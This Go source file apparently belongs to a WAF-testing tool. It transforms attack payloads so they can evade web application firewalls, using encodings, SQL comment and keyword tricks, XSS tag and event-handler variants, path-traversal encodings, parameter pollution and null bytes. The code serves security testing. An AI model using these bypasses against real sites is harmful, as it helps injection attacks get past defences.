// Package waf provides WAF evasion techniques for testing
package waf

import (
	"encoding/base64"
	"encoding/hex"
	"net/url"
	"strings"
	"unicode"
	"unicode/utf16"

	"github.com/waftester/waftester/pkg/bufpool"
	"github.com/waftester/waftester/pkg/hexutil"
	"golang.org/x/text/cases"
	"golang.org/x/text/language"
)

// Pre-compiled replacers for performance (avoid creating in hot loops)
var (
	sqlUnionReplacer = strings.NewReplacer("union", "UNION ALL", "UNION", "UNION ALL")
	sqlOrReplacer    = strings.NewReplacer(" or ", " || ", " OR ", " || ")
	sqlAndReplacer   = strings.NewReplacer(" and ", " && ", " AND ", " && ")

	xssImgReplacer     = strings.NewReplacer("<script>alert(1)</script>", "<img src=x onerror=alert(1)>")
	xssSvgReplacer     = strings.NewReplacer("<script>", "<svg onload=", "</script>", ">")
	xssBodyReplacer    = strings.NewReplacer("<script>", "<body onload=", "</script>", ">")
	xssInputReplacer   = strings.NewReplacer("<script>alert(1)</script>", "<input onfocus=alert(1) autofocus>")
	xssDetailsReplacer = strings.NewReplacer("<script>alert(1)</script>", "<details open ontoggle=alert(1)>")
)

// Evasion provides payload transformation for WAF bypass testing
type Evasion struct {
	techniques []EvasionTechnique
}

// EvasionTechnique represents a single evasion method
type EvasionTechnique struct {
	Name        string
	Description string
	Category    string // encoding, obfuscation, case, chunking, protocol
	Transform   func(payload string) []string
}

// TransformedPayload represents a payload after evasion transformation
type TransformedPayload struct {
	Original    string `json:"original"`
	Transformed string `json:"transformed"`
	Technique   string `json:"technique"`
	Category    string `json:"category"`
}

// NewEvasion creates a new evasion instance with all techniques
func NewEvasion() *Evasion {
	e := &Evasion{}
	e.initTechniques()
	return e
}

// Transform applies all evasion techniques to a payload
func (e *Evasion) Transform(payload string) []TransformedPayload {
	results := make([]TransformedPayload, 0)

	for _, tech := range e.techniques {
		transformed := tech.Transform(payload)
		for _, t := range transformed {
			results = append(results, TransformedPayload{
				Original:    payload,
				Transformed: t,
				Technique:   tech.Name,
				Category:    tech.Category,
			})
		}
	}

	return results
}

// TransformWithCategory applies only techniques from a specific category
func (e *Evasion) TransformWithCategory(payload, category string) []TransformedPayload {
	results := make([]TransformedPayload, 0)

	for _, tech := range e.techniques {
		if tech.Category == category {
			transformed := tech.Transform(payload)
			for _, t := range transformed {
				results = append(results, TransformedPayload{
					Original:    payload,
					Transformed: t,
					Technique:   tech.Name,
					Category:    tech.Category,
				})
			}
		}
	}

	return results
}

// GetTechniques returns all available techniques
func (e *Evasion) GetTechniques() []EvasionTechnique {
	return e.techniques
}

func (e *Evasion) initTechniques() {
	e.techniques = []EvasionTechnique{
		// === ENCODING TECHNIQUES ===
		{
			Name:        "url_encode",
			Description: "Standard URL encoding",
			Category:    "encoding",
			Transform: func(payload string) []string {
				return []string{url.QueryEscape(payload)}
			},
		},
		{
			Name:        "double_url_encode",
			Description: "Double URL encoding",
			Category:    "encoding",
			Transform: func(payload string) []string {
				first := url.QueryEscape(payload)
				return []string{url.QueryEscape(first)}
			},
		},
		{
			Name:        "hex_encode",
			Description: "Hex encoding with \\x prefix",
			Category:    "encoding",
			Transform: func(payload string) []string {
				result := bufpool.GetString()
				defer bufpool.PutString(result)
				for _, b := range []byte(payload) {
					hexutil.WriteHexEscape(result, b)
				}
				return []string{result.String()}
			},
		},
		{
			Name:        "unicode_encode",
			Description: "Unicode encoding with \\u prefix",
			Category:    "encoding",
			Transform: func(payload string) []string {
				result := bufpool.GetString()
				defer bufpool.PutString(result)
				for _, r := range payload {
					hexutil.WriteUnicodeEscape(result, r)
				}
				return []string{result.String()}
			},
		},
		{
			Name:        "html_entity_encode",
			Description: "HTML entity encoding",
			Category:    "encoding",
			Transform: func(payload string) []string {
				results := make([]string, 0, 2)
				// Named entities for common chars
				named := bufpool.GetString()
				defer bufpool.PutString(named)
				for _, r := range payload {
					switch r {
					case '<':
						named.WriteString("&lt;")
					case '>':
						named.WriteString("&gt;")
					case '"':
						named.WriteString("&quot;")
					case '\'':
						named.WriteString("&#39;")
					case '&':
						named.WriteString("&amp;")
					default:
						named.WriteRune(r)
					}
				}
				results = append(results, named.String())

				// Numeric entities
				numeric := bufpool.GetString()
				defer bufpool.PutString(numeric)
				for _, r := range payload {
					if r < 128 && r > 31 {
						hexutil.WriteDecEntity(numeric, r)
					} else {
						numeric.WriteRune(r)
					}
				}
				results = append(results, numeric.String())

				// Hex entities
				hexEnt := bufpool.GetString()
				defer bufpool.PutString(hexEnt)
				for _, r := range payload {
					if r < 128 && r > 31 {
						hexutil.WriteHexEntity(hexEnt, r)
					} else {
						hexEnt.WriteRune(r)
					}
				}
				results = append(results, hexEnt.String())

				return results
			},
		},
		{
			Name:        "base64_encode",
			Description: "Base64 encoding",
			Category:    "encoding",
			Transform: func(payload string) []string {
				return []string{base64.StdEncoding.EncodeToString([]byte(payload))}
			},
		},
		{
			Name:        "utf7_encode",
			Description: "UTF-7 encoding",
			Category:    "encoding",
			Transform: func(payload string) []string {
				// Simple UTF-7 for special chars
				result := bufpool.GetString()
				defer bufpool.PutString(result)
				for _, r := range payload {
					if r < 128 && r > 31 && r != '+' && r != '-' {
						result.WriteRune(r)
					} else {
						// Encode as UTF-7
						result.WriteByte('+')
						result.WriteString(base64.StdEncoding.EncodeToString([]byte(string(r))))
						result.WriteByte('-')
					}
				}
				return []string{result.String()}
			},
		},
		{
			Name:        "utf16_encode",
			Description: "UTF-16 encoding variations",
			Category:    "encoding",
			Transform: func(payload string) []string {
				// UTF-16 LE
				encoded := utf16.Encode([]rune(payload))
				leBytes := make([]byte, len(encoded)*2)
				for i, c := range encoded {
					leBytes[i*2] = byte(c)
					leBytes[i*2+1] = byte(c >> 8)
				}
				return []string{hex.EncodeToString(leBytes)}
			},
		},

		// === CASE MANIPULATION ===
		{
			Name:        "case_swap",
			Description: "Random case swapping",
			Category:    "case",
			Transform: func(payload string) []string {
				results := make([]string, 0, 3)

				// Alternating case
				alt := bufpool.GetString()
				defer bufpool.PutString(alt)
				for i, r := range payload {
					if i%2 == 0 {
						alt.WriteRune(unicode.ToUpper(r))
					} else {
						alt.WriteRune(unicode.ToLower(r))
					}
				}
				results = append(results, alt.String())

				// First letter upper of each word
				results = append(results, cases.Title(language.English).String(strings.ToLower(payload)))

				// Random-like pattern
				random := bufpool.GetString()
				defer bufpool.PutString(random)
				for i, r := range payload {
					if (i+1)%3 == 0 {
						random.WriteString(strings.ToUpper(string(r)))
					} else {
						random.WriteString(strings.ToLower(string(r)))
					}
				}
				results = append(results, random.String())

				return results
			},
		},

		// === SQL SPECIFIC ===
		{
			Name:        "sql_comment_injection",
			Description: "SQL comment injection variations",
			Category:    "obfuscation",
			Transform: func(payload string) []string {
				results := make([]string, 0, 5)

				// Inline comments
				results = append(results, strings.ReplaceAll(payload, " ", "/**/"))

				// MySQL version comments
				results = append(results, strings.ReplaceAll(payload, " ", "/*!*/"))

				// Empty comments
				results = append(results, strings.ReplaceAll(payload, " ", "/*! */"))

				// Nested comments (for some DBs)
				results = append(results, strings.ReplaceAll(payload, " ", "/**_**/"))

				// Hash comments for MySQL
				if strings.Contains(payload, "--") {
					results = append(results, strings.ReplaceAll(payload, "--", "#"))
				}

				return results
			},
		},
		{
			Name:        "sql_keyword_alternatives",
			Description: "SQL keyword alternatives",
			Category:    "obfuscation",
			Transform: func(payload string) []string {
				results := make([]string, 0, 5)

				// UNION variations (use pre-compiled replacer)
				if strings.Contains(strings.ToLower(payload), "union") {
					results = append(results, sqlUnionReplacer.Replace(payload))
				}

				// OR variations (use pre-compiled replacer)
				if strings.Contains(strings.ToLower(payload), " or ") {
					results = append(results, sqlOrReplacer.Replace(payload))
				}

				// AND variations (use pre-compiled replacer)
				if strings.Contains(strings.ToLower(payload), " and ") {
					results = append(results, sqlAndReplacer.Replace(payload))
				}

				// Quote alternatives
				results = append(results, strings.ReplaceAll(payload, "'", "\""))
				results = append(results, strings.ReplaceAll(payload, "'", "`"))

				return results
			},
		},
		{
			Name:        "sql_whitespace_alternatives",
			Description: "SQL whitespace alternatives",
			Category:    "obfuscation",
			Transform: func(payload string) []string {
				results := make([]string, 0, 5)

				// Tab instead of space
				results = append(results, strings.ReplaceAll(payload, " ", "\t"))

				// Newline
				results = append(results, strings.ReplaceAll(payload, " ", "\n"))

				// Carriage return + newline
				results = append(results, strings.ReplaceAll(payload, " ", "\r\n"))

				// Vertical tab
				results = append(results, strings.ReplaceAll(payload, " ", "\v"))

				// Form feed
				results = append(results, strings.ReplaceAll(payload, " ", "\f"))

				// Multiple spaces
				results = append(results, strings.ReplaceAll(payload, " ", "  "))

				return results
			},
		},

		// === XSS SPECIFIC ===
		{
			Name:        "xss_tag_variations",
			Description: "XSS tag variations",
			Category:    "obfuscation",
			Transform: func(payload string) []string {
				results := make([]string, 0, 10)

				// SVG instead of script (use pre-compiled replacer for both tags)
				results = append(results, xssSvgReplacer.Replace(payload))

				// IMG tag (use pre-compiled replacer)
				results = append(results, xssImgReplacer.Replace(payload))

				// BODY tag (use pre-compiled replacer)
				results = append(results, xssBodyReplacer.Replace(payload))

				// Input tag (use pre-compiled replacer)
				results = append(results, xssInputReplacer.Replace(payload))

				// Details/summary (use pre-compiled replacer)
				results = append(results, xssDetailsReplacer.Replace(payload))

				return results
			},
		},
		{
			Name:        "xss_event_handlers",
			Description: "Alternative XSS event handlers",
			Category:    "obfuscation",
			Transform: func(payload string) []string {
				handlers := []string{
					"onmouseover", "onfocus", "onerror", "onload",
					"onclick", "onmouseenter", "onanimationend",
					"ontransitionend", "onpointerover", "ontouchstart",
				}

				results := make([]string, 0, len(handlers))
				for _, handler := range handlers {
					if strings.Contains(payload, "onload") {
						results = append(results, strings.ReplaceAll(payload, "onload", handler))
					}
					if strings.Contains(payload, "onerror") {
						results = append(results, strings.ReplaceAll(payload, "onerror", handler))
					}
				}

				return results
			},
		},
		{
			Name:        "xss_encoding_mix",
			Description: "Mixed encoding for XSS",
			Category:    "encoding",
			Transform: func(payload string) []string {
				results := make([]string, 0, 5)

				// JavaScript escape
				results = append(results, strings.ReplaceAll(payload, "'", "\\'"))

				// JavaScript unicode
				jsUnicode := bufpool.GetString()
				defer bufpool.PutString(jsUnicode)
				for _, r := range payload {
					if r < 128 && r > 31 {
						hexutil.WriteUnicodeEscape(jsUnicode, r)
					} else {
						jsUnicode.WriteRune(r)
					}
				}
				results = append(results, jsUnicode.String())

				// JSFuck-style (simplified)
				jsfuck := payload
				jsfuck = strings.ReplaceAll(jsfuck, "a", "(![]+[])[+!![]]")
				results = append(results, jsfuck)

				return results
			},
		},

		// === PATH TRAVERSAL ===
		{
			Name:        "path_traversal_variations",
			Description: "Path traversal encoding variations",
			Category:    "encoding",
			Transform: func(payload string) []string {
				results := make([]string, 0, 10)

				// Double encoding
				results = append(results, strings.ReplaceAll(payload, "../", "..%252f"))
				results = append(results, strings.ReplaceAll(payload, "../", "..%2f"))

				// Unicode
				results = append(results, strings.ReplaceAll(payload, "../", "..%c0%af"))
				results = append(results, strings.ReplaceAll(payload, "../", "..%c1%9c"))

				// Backslash
				results = append(results, strings.ReplaceAll(payload, "../", "..\\"))
				results = append(results, strings.ReplaceAll(payload, "../", "..%5c"))

				// Mixed
				results = append(results, strings.ReplaceAll(payload, "../", ".%2e/"))
				results = append(results, strings.ReplaceAll(payload, "../", "%2e%2e/"))
				results = append(results, strings.ReplaceAll(payload, "../", "%2e%2e%2f"))

				// URL encoded dot
				results = append(results, strings.ReplaceAll(payload, "../", "..%00/"))

				return results
			},
		},

		// === PROTOCOL LEVEL ===
		{
			Name:        "http_parameter_pollution",
			Description: "HTTP Parameter Pollution",
			Category:    "protocol",
			Transform: func(payload string) []string {
				results := make([]string, 0, 3)

				// Duplicate parameter
				results = append(results, payload+"&id="+payload)

				// Array notation
				results = append(results, "id[]="+payload+"&id[]=safe")

				// JSON in param
				results = append(results, `{"id":"`+payload+`"}`)

				return results
			},
		},
		{
			Name:        "content_type_manipulation",
			Description: "Content-Type manipulation payloads",
			Category:    "protocol",
			Transform: func(payload string) []string {
				// Return payloads meant for different content types
				results := make([]string, 0, 3)

				// JSON wrapper
				results = append(results, `{"data":"`+payload+`"}`)

				// XML wrapper
				results = append(results, `<?xml version="1.0"?><data>`+payload+`</data>`)

				// Multipart boundary
				results = append(results, `------WebKitFormBoundary\r\nContent-Disposition: form-data; name="data"\r\n\r\n`+payload+`\r\n------WebKitFormBoundary--`)

				return results
			},
		},

		// === NULL BYTE & TRUNCATION ===
		{
			Name:        "null_byte_injection",
			Description: "Null byte injection",
			Category:    "obfuscation",
			Transform: func(payload string) []string {
				results := make([]string, 0, 5)

				// Null byte suffix
				results = append(results, payload+"\x00")
				results = append(results, payload+"%00")

				// Null byte in middle
				results = append(results, strings.Replace(payload, " ", "\x00", 1))

				// URL encoded null
				results = append(results, payload+"%00.jpg")
				results = append(results, payload+"%00.html")

				return results
			},
		},

		// === CHUNKING ===
		{
			Name:        "payload_chunking",
			Description: "Split payload into chunks",
			Category:    "chunking",
			Transform: func(payload string) []string {
				if len(payload) < 4 {
					return []string{payload}
				}

				results := make([]string, 0, 3)

				// Split with concat
				mid := len(payload) / 2
				results = append(results, payload[:mid]+"'+'"+payload[mid:])

				// Split with comments (SQL)
				results = append(results, payload[:mid]+"/*split*/"+payload[mid:])

				// String concat
				results = append(results, "concat('"+payload[:mid]+"','"+payload[mid:]+"')")

				return results
			},
		},
	}
}

// CategoryDescriptions provides descriptions for each evasion category
var CategoryDescriptions = map[string]string{
	"encoding":    "Various encoding techniques (URL, Base64, Unicode, HTML entities)",
	"case":        "Case manipulation techniques",
	"obfuscation": "Payload obfuscation methods (comments, alternatives, null bytes)",
	"protocol":    "Protocol-level manipulations (HPP, content-type, chunked)",
	"chunking":    "Payload splitting and chunking techniques",
}
